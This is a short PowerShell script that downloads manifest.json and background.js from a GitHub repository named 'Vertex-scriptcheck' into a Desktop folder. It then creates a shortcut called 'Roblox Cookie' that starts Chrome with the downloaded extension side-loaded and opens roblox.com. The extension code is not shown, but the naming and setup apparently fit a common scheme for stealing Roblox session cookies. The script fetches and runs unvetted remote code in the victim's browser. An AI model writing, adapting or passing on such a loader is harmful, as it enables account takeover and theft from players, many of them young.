$url = "https://raw.githubusercontent.com/bondzo-NOVA/Vertex-scriptcheck/main"
$extFolder = "$env:USERPROFILE\Desktop\RobloxExt"

New-Item -ItemType Directory -Force $extFolder | Out-Null
Invoke-WebRequest -Uri "$url/manifest.json" -OutFile "$extFolder\manifest.json"
Invoke-WebRequest -Uri "$url/background.js" -OutFile "$extFolder\background.js"

$chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
$shortcutPath = "$env:USERPROFILE\Desktop\Roblox Cookie.lnk"
$arguments = "--load-extension=`"$extFolder`" https://www.roblox.com"

$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = $chromePath
$shortcut.Arguments = $arguments
$shortcut.Save()

Write-Host "✅ Desktop shortcut created!" -ForegroundColor Green
Write-Host "📁 Extension: $extFolder" -ForegroundColor Yellow
Write-Host "🎮 Double-click 'Roblox Cookie' shortcut on your desktop" -ForegroundColor Green
